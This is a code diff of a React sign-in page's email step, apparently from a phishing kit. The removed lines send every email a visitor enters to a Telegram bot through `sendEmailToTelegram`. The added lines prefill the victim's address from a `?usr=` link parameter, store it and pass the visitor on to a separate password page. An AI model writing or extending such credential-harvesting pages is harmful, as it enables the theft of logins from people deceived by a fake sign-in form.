@@ -1,40 +1,51 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import heroImage from "@/assets/banner.png";
 import Logo from "@/assets/logo-grey.svg";
 import { Link } from "react-router-dom";
 import { ChevronRight } from "lucide-react";
 import Footer from "@/components/Footer/Footer";
-import { sendEmailToTelegram } from "@/bot/telegrambot";
 
 
 const LoginEmail = () => {
-  const [email, setEmail] = useState("");
+ const [email, setEmail] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  // Read ?usr= from URL on mount
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const usr = params.get("usr");
+    if (usr) setEmail(decodeURIComponent(usr));
+  }, []);
 
-    // Empty check
-    if (!email.trim()) {
-      setError("Please enter your email Address to sign in.");
-      return;
-    }
+const handleSubmit = async (e: React.FormEvent) => {
+  e.preventDefault();
+
+  if (!email.trim()) {
+    setError("Please enter your email to sign in.");
+    return;
+  }
+
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email.trim())) {
+    setError("Please enter a valid email address.");
+    return;
+  }
+
+  setError("");
+  setLoading(true);
+
+  sessionStorage.setItem("login_email", email.trim());
 
 
+  setTimeout(() => {
+    setLoading(false);
+    navigate("/login/password", { state: { email: email.trim() } });
+  }, 600);
+};
 
-    setError("");
-    setLoading(true);
-
-    await sendEmailToTelegram(email);
-
-    setTimeout(() => {
-      setLoading(false);
-      navigate("/login/password", { state: { email } });
-    }, 600);
-  };
 
   return (
     <main className="h-screen overflow-y-auto bg-background">
